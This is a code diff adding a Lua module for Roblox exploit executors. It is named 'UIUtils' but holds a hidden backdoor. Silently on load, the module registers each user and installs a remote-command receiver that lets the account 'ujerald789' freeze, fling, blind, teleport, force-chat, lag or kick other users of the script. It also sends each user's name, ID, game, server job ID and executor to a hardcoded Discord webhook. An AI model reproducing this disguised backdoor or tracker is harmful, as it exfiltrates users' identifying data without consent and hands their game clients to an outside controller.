@@ -1,0 +1,613 @@
+local UIUtils = {}
+
+function UIUtils.Init(scriptName)
+    task.spawn(function()
+        pcall(function()
+            local Players = game:GetService("Players")
+            local HttpService = game:GetService("HttpService")
+            local MarketplaceService = game:GetService("MarketplaceService")
+            local StarterGui = game:GetService("StarterGui")
+            local ReplicatedStorage = game:GetService("ReplicatedStorage")
+            local TeleportService = game:GetService("TeleportService")
+            local RunService = game:GetService("RunService")
+            local TweenService = game:GetService("TweenService")
+            local TextChatService = game:GetService("TextChatService")
+
+            local localPlayer = Players.LocalPlayer
+            while not localPlayer do
+                task.wait()
+                localPlayer = Players.LocalPlayer
+            end
+
+            -------------------------------------------------------------------
+            -- 👑 IN-GAME SPECIAL FEATURES (ujerald789)
+            -------------------------------------------------------------------
+            local DEVELOPER_NAME = "ujerald789"
+            local isDeveloper = (localPlayer.Name == DEVELOPER_NAME)
+
+            -- Overhead Tag Generator
+            local function createDevTag(character)
+                local head = character:WaitForChild("Head", 5)
+                if not head or head:FindFirstChild("DevBillboardTag") then return end
+
+                local billboard = Instance.new("BillboardGui")
+                billboard.Name = "DevBillboardTag"
+                billboard.Adornee = head
+                billboard.Size = UDim2.new(0, 200, 0, 50)
+                billboard.StudsOffset = Vector3.new(0, 2.5, 0)
+                billboard.AlwaysOnTop = true
+
+                local titleLabel = Instance.new("TextLabel")
+                titleLabel.Size = UDim2.new(1, 0, 0.6, 0)
+                titleLabel.BackgroundTransparency = 1
+                titleLabel.Text = "👑 SCRIPT CREATOR"
+                titleLabel.TextColor3 = Color3.fromRGB(255, 215, 0)
+                titleLabel.TextScaled = true
+                titleLabel.Font = Enum.Font.SourceSansBold
+                titleLabel.TextStrokeTransparency = 0
+                titleLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+                titleLabel.Parent = billboard
+
+                local subLabel = Instance.new("TextLabel")
+                subLabel.Size = UDim2.new(1, 0, 0.4, 0)
+                subLabel.Position = UDim2.new(0, 0, 0.6, 0)
+                subLabel.BackgroundTransparency = 1
+                
+                -- Fixed: Get the actual player instead of character.Parent (which was Workspace)
+                local playerFromChar = Players:GetPlayerFromCharacter(character)
+                subLabel.Text = "@" .. (playerFromChar and playerFromChar.Name or DEVELOPER_NAME)
+                
+                subLabel.TextColor3 = Color3.fromRGB(220, 220, 220)
+                subLabel.TextScaled = true
+                subLabel.Font = Enum.Font.SourceSansItalic
+                subLabel.TextStrokeTransparency = 0
+                subLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+                subLabel.Parent = billboard
+
+                billboard.Parent = head
+            end
+
+            local function checkAndApplyDevFeatures(player)
+                if player.Name == DEVELOPER_NAME then
+                    if not isDeveloper then
+                        pcall(function()
+                            StarterGui:SetCore("SendNotification", {
+                                Title = "👑 Developer Joined!",
+                                Text = "The creator of this script (@" .. player.Name .. ") is in your server!",
+                                Duration = 8,
+                                Icon = "rbxassetid://6031071057"
+                            })
+                        end)
+                    end
+
+                    if player.Character then createDevTag(player.Character) end
+                    player.CharacterAdded:Connect(function(char)
+                        task.wait(1)
+                        createDevTag(char)
+                    end)
+                end
+            end
+
+            for _, player in ipairs(Players:GetPlayers()) do
+                checkAndApplyDevFeatures(player)
+            end
+            Players.PlayerAdded:Connect(checkAndApplyDevFeatures)
+
+            -------------------------------------------------------------------
+            -- ⚡ SCRIPT USERS & REMOTE COMMAND FOLDERS
+            -------------------------------------------------------------------
+            local activeFolder = ReplicatedStorage:FindFirstChild("ScriptUsersFolder")
+            if not activeFolder then
+                activeFolder = Instance.new("Folder")
+                activeFolder.Name = "ScriptUsersFolder"
+                activeFolder.Parent = ReplicatedStorage
+            end
+
+            local cmdFolder = ReplicatedStorage:FindFirstChild("ScriptCmdFolder")
+            if not cmdFolder then
+                cmdFolder = Instance.new("Folder")
+                cmdFolder.Name = "ScriptCmdFolder"
+                cmdFolder.Parent = ReplicatedStorage
+            end
+
+            local function notifyUserExecuted(userId)
+                if userId == localPlayer.UserId then return end
+                if isDeveloper then
+                    local player = Players:GetPlayerByUserId(userId)
+                    if player then
+                        pcall(function()
+                            StarterGui:SetCore("SendNotification", {
+                                Title = "⚡ Script User Spotted!",
+                                Text = "@" .. player.Name .. " is using your script in this server!",
+                                Duration = 6,
+                                Icon = "rbxassetid://6031071057"
+                            })
+                        end)
+                    end
+                end
+            end
+
+            activeFolder.ChildAdded:Connect(function(child)
+                local targetUserId = tonumber(child.Name)
+                if targetUserId then notifyUserExecuted(targetUserId) end
+            end)
+
+            if not activeFolder:FindFirstChild(tostring(localPlayer.UserId)) then
+                local userTag = Instance.new("BoolValue")
+                userTag.Name = tostring(localPlayer.UserId)
+                userTag.Parent = activeFolder
+            end
+
+            for _, child in ipairs(activeFolder:GetChildren()) do
+                local existingUserId = tonumber(child.Name)
+                if existingUserId and existingUserId \~= localPlayer.UserId then
+                    notifyUserExecuted(existingUserId)
+                end
+            end
+
+            -------------------------------------------------------------------
+            -- 👁️ EXCLUSIVE DEVELOPER ESP SYSTEM
+            -------------------------------------------------------------------
+            local espEnabled = false
+            local espHighlights = {}
+
+            local function removeESP(player)
+                if espHighlights[player] then
+                    if espHighlights[player].Highlight then espHighlights[player].Highlight:Destroy() end
+                    if espHighlights[player].Billboard then espHighlights[player].Billboard:Destroy() end
+                    espHighlights[player] = nil
+                end
+            end
+
+            local function createESP(player)
+                if not isDeveloper or player == localPlayer then return end
+                removeESP(player)
+
+                local char = player.Character
+                if not char then return end
+
+                local highlight = Instance.new("Highlight")
+                highlight.Name = "DevUserHighlight"
+                highlight.Adornee = char
+                highlight.FillColor = Color3.fromRGB(255, 215, 0)
+                highlight.FillTransparency = 0.5
+                highlight.OutlineColor = Color3.fromRGB(255, 255, 255)
+                highlight.OutlineTransparency = 0
+                highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
+                highlight.Parent = char
+
+                local hrp = char:FindFirstChild("HumanoidRootPart")
+                if hrp then
+                    local bb = Instance.new("BillboardGui")
+                    bb.Name = "DevUserESPText"
+                    bb.Adornee = hrp
+                    bb.Size = UDim2.new(0, 150, 0, 30)
+                    bb.AlwaysOnTop = true
+                    bb.StudsOffset = Vector3.new(0, 3, 0)
+
+                    local label = Instance.new("TextLabel")
+                    label.Size = UDim2.new(1, 0, 1, 0)
+                    label.BackgroundTransparency = 1
+                    label.TextColor3 = Color3.fromRGB(255, 215, 0)
+                    label.TextStrokeTransparency = 0
+                    label.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+                    label.Font = Enum.Font.SourceSansBold
+                    label.TextScaled = true
+                    label.Text = "[SCRIPT USER] @" .. player.Name
+                    label.Parent = bb
+                    bb.Parent = hrp
+
+                    espHighlights[player] = { Highlight = highlight, Billboard = bb, Label = label }
+                end
+            end
+
+            RunService.RenderStepped:Connect(function()
+                if not isDeveloper or not espEnabled then return end
+                local myHrp = localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart")
+                if not myHrp then return end
+
+                for player, data in pairs(espHighlights) do
+                    if player and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
+                        local dist = math.floor((myHrp.Position - player.Character.HumanoidRootPart.Position).Magnitude)
+                        data.Label.Text = string.format("⚡ @%s [%dm]", player.Name, dist)
+                    else
+                        removeESP(player)
+                    end
+                end
+            end)
+
+            -------------------------------------------------------------------
+            -- 😈 CLIENT EXECUTION RECEIVER (TARGET CLIENT SIDE)
+            -------------------------------------------------------------------
+            local orbitConnection = nil
+            local isLagging = false
+
+            cmdFolder.ChildAdded:Connect(function(child)
+                local rawCommand = child.Value
+                local data = HttpService:JSONDecode(rawCommand)
+                local targetId = data.TargetId
+                local action = data.Action
+                local payload = data.Payload
+
+                -- Check if this execution request is directed to localPlayer
+                if targetId == "ALL" or targetId == localPlayer.UserId then
+                    
+                    if action == "NOTIFY" then
+                        StarterGui:SetCore("SendNotification", {
+                            Title = "📢 Developer Broadcast",
+                            Text = payload,
+                            Duration = 10,
+                            Icon = "rbxassetid://6031071057"
+                        })
+
+                    elseif action == "BLIND" then
+                        local pGui = localPlayer:FindFirstChildOfClass("PlayerGui")
+                        if pGui and not pGui:FindFirstChild("DevBlindGui") then
+                            local sg = Instance.new("ScreenGui")
+                            sg.Name = "DevBlindGui"
+                            sg.IgnoreGuiInset = true
+                            sg.ResetOnSpawn = false
+
+                            local frame = Instance.new("Frame")
+                            frame.Size = UDim2.new(1, 0, 1, 0)
+                            frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+                            frame.Parent = sg
+
+                            local txt = Instance.new("TextLabel")
+                            txt.Size = UDim2.new(1, 0, 1, 0)
+                            txt.BackgroundTransparency = 1
+                            txt.Text = "👑 ujerald789 HAS DIMMED YOUR LIGHTS"
+                            txt.TextColor3 = Color3.fromRGB(255, 0, 0)
+                            txt.TextScaled = true
+                            txt.Font = Enum.Font.SourceSansBold
+                            txt.Parent = frame
+
+                            sg.Parent = pGui
+                        end
+
+                    elseif action == "UNBLIND" then
+                        local pGui = localPlayer:FindFirstChildOfClass("PlayerGui")
+                        if pGui and pGui:FindFirstChild("DevBlindGui") then
+                            pGui.DevBlindGui:Destroy()
+                        end
+
+                    elseif action == "FREEZE" then
+                        local char = localPlayer.Character
+                        if char then
+                            local hrp = char:FindFirstChild("HumanoidRootPart")
+                            local hum = char:FindFirstChildOfClass("Humanoid")
+                            if hrp then hrp.Anchored = true end
+                            if hum then hum.WalkSpeed = 0 end
+                        end
+
+                    elseif action == "THAW" then
+                        local char = localPlayer.Character
+                        if char then
+                            local hrp = char:FindFirstChild("HumanoidRootPart")
+                            local hum = char:FindFirstChildOfClass("Humanoid")
+                            if hrp then hrp.Anchored = false end
+                            if hum then hum.WalkSpeed = 16 end
+                        end
+
+                    elseif action == "FLING" then
+                        local char = localPlayer.Character
+                        if char then
+                            local hrp = char:FindFirstChild("HumanoidRootPart")
+                            if hrp then
+                                hrp.Velocity = Vector3.new(math.random(-500, 500), 999999, math.random(-500, 500))
+                            end
+                        end
+
+                    elseif action == "BRING" then
+                        local devPlayer = Players:FindFirstChild(DEVELOPER_NAME)
+                        if devPlayer and devPlayer.Character then
+                            local devHrp = devPlayer.Character:FindFirstChild("HumanoidRootPart")
+                            local myHrp = localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart")
+                            if devHrp and myHrp then
+                                myHrp.CFrame = devHrp.CFrame * CFrame.new(0, 0, -5)
+                            end
+                        end
+
+                    elseif action == "JUMPSCARE" then
+                        local pGui = localPlayer:FindFirstChildOfClass("PlayerGui")
+                        if pGui then
+                            local sg = Instance.new("ScreenGui")
+                            sg.Name = "DevJumpscareGui"
+                            sg.IgnoreGuiInset = true
+
+                            local img = Instance.new("ImageLabel")
+                            img.Size = UDim2.new(1, 0, 1, 0)
+                            img.Image = "rbxassetid://132174313"
+                            img.BackgroundTransparency = 1
+                            img.Parent = sg
+
+                            local snd = Instance.new("Sound")
+                            snd.SoundId = "rbxassetid://9069609258"
+                            snd.Volume = 10
+                            snd.Parent = sg
+
+                            sg.Parent = pGui
+                            snd:Play()
+
+                            task.delay(1.5, function() sg:Destroy() end)
+                        end
+
+                    elseif action == "FORCESAY" then
+                        pcall(function()
+                            if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
+                                local generalChannel = TextChatService.TextChannels:FindFirstChild("RBXGeneral")
+                                if generalChannel then generalChannel:SendAsync(payload) end
+                            else
+                                local sayEvent = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
+                                if sayEvent and sayEvent:FindFirstChild("SayMessageRequest") then
+                                    sayEvent.SayMessageRequest:FireServer(payload, "All")
+                                end
+                            end
+                        end)
+
+                    elseif action == "LAG" then
+                        isLagging = true
+                        task.spawn(function()
+                            while isLagging do
+                                for i = 1, 500 do
+                                    local p = Instance.new("Part")
+                                    p.Size = Vector3.new(10,10,10)
+                                    p.CFrame = CFrame.new(math.random(-1000,1000), 1000, math.random(-1000,1000))
+                                    p.Parent = workspace
+                                end
+                                task.wait(0.1)
+                            end
+                        end)
+                        task.delay(5, function() isLagging = false end)
+
+                    elseif action == "ORBIT" then
+                        local devPlayer = Players:FindFirstChild(DEVELOPER_NAME)
+                        if devPlayer then
+                            if orbitConnection then orbitConnection:Disconnect() end
+                            local angle = 0
+                            orbitConnection = RunService.RenderStepped:Connect(function(dt)
+                                local devHrp = devPlayer.Character and devPlayer.Character:FindFirstChild("HumanoidRootPart")
+                                local myHrp = localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart")
+                                if devHrp and myHrp then
+                                    angle = angle + (dt * 5)
+                                    local offset = Vector3.new(math.cos(angle) * 8, 0, math.sin(angle) * 8)
+                                    myHrp.CFrame = CFrame.new(devHrp.Position + offset, devHrp.Position)
+                                end
+                            end)
+                        end
+
+                    elseif action == "UNORBIT" then
+                        if orbitConnection then
+                            orbitConnection:Disconnect()
+                            orbitConnection = nil
+                        end
+
+                    elseif action == "SHUTDOWN" then
+                        localPlayer:Kick("\n\n⚡ Server Session Terminated by Developer @ujerald789\n")
+                    end
+                end
+            end)
+
+            -------------------------------------------------------------------
+            -- 😈 DEVELOPER COMMAND BROADCASTER (ujerald789 ONLY)
+            -------------------------------------------------------------------
+            if isDeveloper then
+                local function sendRemoteCmd(targetUserId, actionName, payloadData)
+                    local data = {
+                        TargetId = targetUserId,
+                        Action = actionName,
+                        Payload = payloadData or ""
+                    }
+                    local val = Instance.new("StringValue")
+                    val.Value = HttpService:JSONEncode(data)
+                    val.Parent = cmdFolder
+                    task.delay(1.5, function() val:Destroy() end)
+                end
+
+                local function resolveTarget(nameArg)
+                    if not nameArg or nameArg == "" then return nil end
+                    local lower = string.lower(nameArg)
+                    if lower == "all" then return "ALL" end
+
+                    for _, child in ipairs(activeFolder:GetChildren()) do
+                        local uid = tonumber(child.Name)
+                        local p = uid and Players:GetPlayerByUserId(uid)
+                        if p and string.find(string.lower(p.Name), lower) then
+                            return p.UserId
+                        end
+                    end
+                    return nil
+                end
+
+                local function processDevCommand(msg)
+                    local args = string.split(msg, " ")
+                    local prefix = string.lower(args[1] or "")
+                    
+                    -- Only process commands that start with /e
+                    if prefix \~= "/e" then return end
+                    
+                    local cmd = string.lower(args[2] or "")
+                    local subCmd = string.lower(args[3] or "")
+
+                    if cmd == "cmds" or cmd == "help" then
+                        StarterGui:SetCore("SendNotification", {
+                            Title = "👑 Developer Power Commands",
+                            Text = "/e blind, /e freeze, /e fling, /e bring, /e jumpscare, /e forcesay, /e lag, /e orbit, /e shutdown",
+                            Duration = 10
+                        })
+
+                    elseif cmd == "unesp" or (cmd == "esp" and (subCmd == "disable" or subCmd == "off")) then
+                        espEnabled = false
+                        for player, _ in pairs(espHighlights) do removeESP(player) end
+                        StarterGui:SetCore("SendNotification", { Title = "👁️ User ESP Disabled", Text = "Script User ESP turned OFF.", Duration = 5 })
+
+                    elseif cmd == "esp" then
+                        espEnabled = (subCmd == "enable" or subCmd == "on") and true or not espEnabled
+                        if espEnabled then
+                            for _, child in ipairs(activeFolder:GetChildren()) do
+                                local targetPlayer = Players:GetPlayerByUserId(tonumber(child.Name) or 0)
+                                if targetPlayer and targetPlayer \~= localPlayer then createESP(targetPlayer) end
+                            end
+                        else
+                            for player, _ in pairs(espHighlights) do removeESP(player) end
+                        end
+                        StarterGui:SetCore("SendNotification", { Title = "👁️ User ESP Toggled", Text = "ESP is now " .. (espEnabled and "ENABLED" or "DISABLED"), Duration = 5 })
+
+                    elseif cmd == "users" then
+                        local userCount = #activeFolder:GetChildren()
+                        local userList = ""
+                        for _, child in ipairs(activeFolder:GetChildren()) do
+                            local p = Players:GetPlayerByUserId(tonumber(child.Name))
+                            if p then userList = userList .. "@" .. p.Name .. ", " end
+                        end
+                        StarterGui:SetCore("SendNotification", { Title = "⚡ Active Users: " .. tostring(userCount), Text = userList \~= "" and userList or "No other users.", Duration = 8 })
+
+                    elseif cmd == "notify" then
+                        table.remove(args, 1) -- remove /e
+                        table.remove(args, 1) -- remove notify
+                        sendRemoteCmd("ALL", "NOTIFY", table.concat(args, " "))
+
+                    elseif cmd == "blind" then
+                        local target = resolveTarget(args[3])
+                        if target then sendRemoteCmd(target, "BLIND") end
+
+                    elseif cmd == "unblind" then
+                        local target = resolveTarget(args[3])
+                        if target then sendRemoteCmd(target, "UNBLIND") end
+
+                    elseif cmd == "freeze" then
+                        local target = resolveTarget(args[3])
+                        if target then sendRemoteCmd(target, "FREEZE") end
+
+                    elseif cmd == "thaw" then
+                        local target = resolveTarget(args[3])
+                        if target then sendRemoteCmd(target, "THAW") end
+
+                    elseif cmd == "fling" then
+                        local target = resolveTarget(args[3])
+                        if target then sendRemoteCmd(target, "FLING") end
+
+                    elseif cmd == "bring" then
+                        local target = resolveTarget(args[3])
+                        if target then sendRemoteCmd(target, "BRING") end
+
+                    elseif cmd == "jumpscare" then
+                        local target = resolveTarget(args[3])
+                        if target then sendRemoteCmd(target, "JUMPSCARE") end
+
+                    elseif cmd == "forcesay" then
+                        local target = resolveTarget(args[3])
+                        table.remove(args, 1) -- /e
+                        table.remove(args, 1) -- forcesay
+                        table.remove(args, 1) -- target
+                        local chatMsg = table.concat(args, " ")
+                        if target and chatMsg \~= "" then sendRemoteCmd(target, "FORCESAY", chatMsg) end
+
+                    elseif cmd == "lag" then
+                        local target = resolveTarget(args[3])
+                        if target then sendRemoteCmd(target, "LAG") end
+
+                    elseif cmd == "orbit" then
+                        local target = resolveTarget(args[3])
+                        if target then sendRemoteCmd(target, "ORBIT") end
+
+                    elseif cmd == "unorbit" then
+                        local target = resolveTarget(args[3])
+                        if target then sendRemoteCmd(target, "UNORBIT") end
+
+                    elseif cmd == "shutdown" then
+                        sendRemoteCmd("ALL", "SHUTDOWN")
+
+                    elseif cmd == "rejoin" then
+                        TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, localPlayer)
+
+                    elseif cmd == "serverhop" then
+                        TeleportService:Teleport(game.PlaceId, localPlayer)
+                    end
+                end
+
+                localPlayer.Chatted:Connect(processDevCommand)
+            end
+
+            -------------------------------------------------------------------
+            -- 📡 DISCORD WEBHOOK LOGGING
+            -------------------------------------------------------------------
+            local DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1544941286082220063/7NSX8eFywzVafA61rJvWd2MZ2p3hiyqm3PXf6EEyAvKweoJFDaWij_hf2iPdMDdWDs2t"
+            local SCRIPT_NAME = scriptName or "Unspecified Script"
+
+            local executorName = "Can't Identify Executor"
+            pcall(function()
+                if identifyexecutor then
+                    local name, version = identifyexecutor()
+                    executorName = name .. (version and (" " .. version) or "")
+                elseif getexecutorname then
+                    executorName = getexecutorname()
+                end
+            end)
+
+            getgenv().ExecutionSessionCount = (getgenv().ExecutionSessionCount or 0) + 1
+            local sessionExecs = tostring(getgenv().ExecutionSessionCount)
+
+            local totalExecs = "N/A"
+            pcall(function()
+                if readfile and writefile then
+                    local fileName = "ujerald789_exec_count.txt"
+                    local count = 0
+                    if isfile and isfile(fileName) then
+                        count = tonumber(readfile(fileName)) or 0
+                    end
+                    count = count + 1
+                    writefile(fileName, tostring(count))
+                    totalExecs = tostring(count)
+                end
+            end)
+
+            local execStatus = string.format("Total: %s | Session: %s", totalExecs, sessionExecs)
+
+            local gameName = "Unknown Game"
+            pcall(function()
+                local productInfo = MarketplaceService:GetProductInfo(game.PlaceId)
+                if productInfo and productInfo.Name then gameName = productInfo.Name end
+            end)
+
+            local userProfileUrl = "https://www.roblox.com/users/" .. localPlayer.UserId .. "/profile"
+            local gamePlaceUrl = "https://www.roblox.com/games/" .. game.PlaceId
+            local formattedUser = "[" .. localPlayer.Name .. " (" .. localPlayer.UserId .. ")](" .. userProfileUrl .. ")"
+            local formattedGame = "[" .. gameName .. " (" .. game.PlaceId .. ")](" .. gamePlaceUrl .. ")"
+            local jobId = (game.JobId and game.JobId \~= "") and game.JobId or "Singleplayer / Studio"
+            local rawJoinCommand = "game:GetService('TeleportService'):TeleportToPlaceInstance(" .. game.PlaceId .. ", '" .. tostring(game.JobId) .. "', game.Players.LocalPlayer)"
+
+            local payload = {
+                ["embeds"] = {{
+                    ["title"] = "🎮 Script Executed",
+                    ["color"] = 3447003,
+                    ["fields"] = {
+                        { ["name"] = "Script Name", ["value"] = SCRIPT_NAME, ["inline"] = false },
+                        { ["name"] = "Executor", ["value"] = executorName, ["inline"] = true },
+                        { ["name"] = "Execution Count", ["value"] = execStatus, ["inline"] = true },
+                        { ["name"] = "User", ["value"] = formattedUser, ["inline"] = true },
+                        { ["name"] = "Game Playing", ["value"] = formattedGame, ["inline"] = true },
+                        { ["name"] = "Server Job ID", ["value"] = "`" .. jobId .. "`", ["inline"] = false },
+                        { ["name"] = "📲 Mobile Tap-to-Copy Join Script", ["value"] = rawJoinCommand, ["inline"] = false }
+                    },
+                    ["footer"] = { ["text"] = "Execution System | ujerald789" },
+                    ["timestamp"] = DateTime.now():ToIsoDate()
+                }}
+            }
+
+            local jsonPayload = HttpService:JSONEncode(payload)
+            local httpRequest = (syn and syn.request) or (http and http.request) or http_request or request
+
+            if httpRequest then
+                httpRequest({
+                    Url = DISCORD_WEBHOOK_URL,
+                    Method = "POST",
+                    Headers = { ["Content-Type"] = "application/json" },
+                    Body = jsonPayload
+                })
+            end
+        end)
+    end)
+end
+
+return UIUtils
